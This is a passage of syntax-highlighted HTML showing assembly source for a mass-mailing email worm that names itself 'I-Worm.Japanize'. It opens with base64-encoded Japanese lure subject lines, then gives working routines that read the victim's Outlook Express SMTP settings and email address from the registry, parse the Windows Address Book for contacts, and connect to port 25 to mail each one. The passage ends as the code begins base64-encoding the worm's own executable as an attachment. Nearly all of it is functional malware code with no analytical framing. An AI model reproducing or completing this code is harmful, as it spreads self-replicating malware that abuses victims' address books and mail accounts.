</span><span class="sc5">js_02</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'UmU6GyRCPUVNVxsoQg=='</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc1">;  Re:èdóv</span><span class="sc0">
</span><span class="sc5">js_03</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'GyRCPUVNVyRKJCpDTiRpJDsbKEI='</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc1">;  èdóvÇ»Ç®ímÇÁÇπ</span><span class="sc0">
</span><span class="sc5">js_04</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'UmU6GyRCPUVNVyRKJCpDTiRpJDsbKEI='</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc1">;  Re:èdóvÇ»Ç®ÇµÇÁÇπ</span><span class="sc0">
</span><span class="sc5">js_05</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'GyRCTmMkTjdvGyhC'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">;  ó·ÇÃåè</span><span class="sc0">
</span><span class="sc5">js_06</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'UmU6GyRCTmMkTjdvGyhC'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc1">;  Re:ó·ÇÃåè</span><span class="sc0">
</span><span class="sc5">js_07</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'GyRCJCo1VyQ3JFYkaiRHJDkbKEI='</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc1">;  Ç®ãvÇµÇ‘ÇËÇ≈Ç∑</span><span class="sc0">
</span><span class="sc5">js_08</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'UmU6GyRCJCo1VyQ3JFYkaiRHJDkbKEI='</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc1">;  Re:Ç®ãvÇµÇ‘ÇËÇ≈Ç∑</span><span class="sc0">
</span><span class="sc5">js_09</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'GyRCJDMkcyRLJEEkTxsoQg=='</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc1">;  Ç±ÇÒÇ…ÇøÇÕ</span><span class="sc0">
</span><span class="sc5">js_10</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'UmU6GyRCJDMkcyRLJEEkTxsoQg=='</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc1">;  Re:Ç±ÇÒÇ…ÇøÇÕ</span><span class="sc0">
</span><span class="sc5">js_11</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'GyRCNktIaxsoQg=='</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">;  ã…îÈ</span><span class="sc0">
</span><span class="sc5">js_12</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'UmU6GyRCNktIaxsoQg=='</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc1">;  Re:ã…îÈ</span><span class="sc0">
</span><span class="sc5">js_13</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'GyRCO3FOQRsoQg=='</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">;  éëóø</span><span class="sc0">
</span><span class="sc5">js_14</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'UmU6GyRCO3FOQRsoQg=='</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc1">;  Re:éëóø</span><span class="sc0">
</span><span class="sc5">js_15</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'GyRCMz8bKEI='</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">;  ≥ø∫</span><span class="sc0">
</span><span class="sc5">js_16</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'GyRCJSYlYxsoQlI='</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">;  ÉEÉ\ÉR</span><span class="sc0">
</span><span class="sc5">js_17</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'GyRCJCYkcyQzGyhC'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">;  Ç§ÇÒÇ±</span><span class="sc0">
    
    </span><span class="sc9">.code</span><span class="sc0">
</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">GetTickCount</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">r_seed</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@@go</span><span class="sc0">
    </span><span class="sc1">;;  signature :)</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'XXXXXXXXXXXXXXXXXXXXXXXXXXX'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'XXXXX I-Worm.Japanize XXXXX'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'XXXXXXXXXXXXXXXXXXXXXXXXXXX'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">@@go</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_some_info</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">buffer</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0101h</span><span class="sc0">
    </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">WSAStartup</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">exit</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">open_wab</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">clean_sock</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">create_base64enc</span><span class="sc0">
    
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">spread</span><span class="sc0">

</span><span class="sc5">free_mem</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ptr_base64buf</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">GlobalUnlock</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hmemout</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">GlobalFree</span><span class="sc0">
    
</span><span class="sc5">close_wab4</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hwab4file</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hwab4map</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hwab4mapview</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">CloseHandle</span><span class="sc0">
    </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">CloseHandle</span><span class="sc0">
    </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">CloseHandle</span><span class="sc0">
    
</span><span class="sc5">clean_sock</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">WSACleanup</span><span class="sc0">
    
</span><span class="sc5">exit</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">ExitProcess</span><span class="sc0">

    
    
</span><span class="sc5">spread</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc1">;;  lifewire ;)</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hwab4mapview</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">64h</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;  num of addr</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">@@exit</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">60h</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;  ptr to addr</span><span class="sc0">

    </span><span class="sc5">@@spread_loop</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc5">by</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">@@nounicode</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">target_mailaddr</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">48h</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc5">@@1</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lodsw</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">@@1</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">

    </span><span class="sc5">@@nounicode</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">spread2</span><span class="sc0">

    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">24h</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">@@spread_loop</span><span class="sc0">
    
    </span><span class="sc5">@@exit</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
    
    
</span><span class="sc5">spread2</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;  now esi=email addr</span><span class="sc0">
    
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">socket</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">sock</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">wo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">sin_family</span><span class="sc4">],</span><span class="sc5">AF_INET</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">25</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">wo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">sin_port</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">SMTP_Server</span><span class="sc0">
    </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">gethostbyname</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">@@exit</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">sin_addr</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">len_sockaddr_in</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">sockaddr_in</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">sock</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">connect</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">@@exit</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">sendmail</span><span class="sc0">
    
    </span><span class="sc5">@@exit</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
    
    
</span><span class="sc1">;;;  ---</span><span class="sc0">
</span><span class="sc1">;;;  reg stuff</span><span class="sc0">
</span><span class="sc5">get_some_info</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">hReg</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">str_SMInternetAccountManager</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">HKEY_CURRENT_USER</span><span class="sc0">
    </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">RegOpenKeyExA</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">@@error</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">bufsiz_accountidx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">AccountIdx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">str_DMA</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hReg</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">RegQueryValueExA</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">@@error</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hReg</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">RegCloseKey</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">hReg</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">str_SMIAccounts</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">HKEY_CURRENT_USER</span><span class="sc0">
    </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">RegOpenKeyExA</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">@@error</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">bufsiz_SMTPSERVER</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">SMTP_Server</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">str_SMTPNAME</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hReg</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">RegQueryValueExA</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">@@error</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">bufsiz_morons_mailaddr</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">morons_Mailaddr</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">str_SMTPEmailAddr</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hReg</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">RegQueryValueExA</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">@@error</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hReg</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">RegCloseKey</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">hReg</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">str_SMWab4</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">HKEY_CURRENT_USER</span><span class="sc0">
    </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">RegOpenKeyExA</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">@@error</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">bufsiz_wab4_path</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">wab4_path</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hReg</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">RegQueryValueExA</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">@@error</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hReg</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">RegCloseKey</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
    </span><span class="sc5">@@error</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

    
</span><span class="sc5">open_wab</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">FILE_ATTRIBUTE_NORMAL</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">OPEN_EXISTING</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">FILE_SHARE_WRITE</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">GENERIC_READ</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">wab4_path</span><span class="sc0">
    </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">CreateFileA</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">@@error</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hwab4file</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">PAGE_READONLY</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">CreateFileMappingA</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hwab4map</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">FILE_MAP_READ</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">MapViewOfFile</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hwab4mapview</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
    </span><span class="sc5">@@error</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">create_base64enc</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">260</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">myfilename</span><span class="sc0">
